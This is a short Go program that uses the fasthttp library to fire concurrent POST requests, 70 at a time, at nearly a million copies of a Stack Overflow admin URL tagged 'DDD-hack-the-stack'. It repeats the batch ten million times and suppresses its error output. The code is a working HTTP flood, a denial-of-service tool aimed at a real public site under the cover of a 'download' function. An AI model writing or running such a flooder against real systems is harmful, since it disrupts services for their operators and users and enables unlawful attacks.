package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

func downloadLink(url string, wg *sync.WaitGroup, client *fasthttp.Client) {
	defer wg.Done()

	req := fasthttp.AcquireRequest()
	defer fasthttp.ReleaseRequest(req)

	req.SetRequestURI(url)
	req.Header.SetMethod("POST")
	req.Header.SetContentType("application/json") // Replace with your actual Content-Type header
	req.SetBodyString("your-request-body")        // Replace with your actual request body

	resp := fasthttp.AcquireResponse()
	defer fasthttp.ReleaseResponse(resp)

	if err := client.Do(req, resp); err != nil {
		// fmt.Printf("Error downloading %s: %s\n", url, err.Error())
		return
	}

	// Handle the response here
	// ...

	// fmt.Printf("Downloaded %s\n", url)
}

func downloadAll(urls []string) {
	concurrencyLimit := 70
	// delay := 1 * time.Nanosecond // Adjust the delay value as needed
	delay := 1 * time.Millisecond // Adjust the delay value as needed

	client := &fasthttp.Client{}
	wg := sync.WaitGroup{}
	semaphore := make(chan struct{}, concurrencyLimit)

	for _, url := range urls {
		wg.Add(1)
		semaphore <- struct{}{}
		go func(u string) {
			defer func() { <-semaphore }()
			downloadLink(u, &wg, client)
			time.Sleep(delay)
		}(url)
	}

	wg.Wait()
}

func main() {
	urlList := make([]string, 999999)
	for i := range urlList {
		urlList[i] = "https://stackoverflow.com/admin.php?DDD-hack-the-stack" // Replace with your actual URL
	}

	iterations := 10000000 // Number of times to iterate the code

	for i := 0; i < iterations; i++ {
		start := time.Now()
		downloadAll(urlList)
		end := time.Now()
		duration := end.Sub(start)
		minutes := duration.Minutes()
		fmt.Printf("Iteration %d: Downloaded %d links in %.2f minutes\n", i+1, len(urlList), minutes)
	}
}
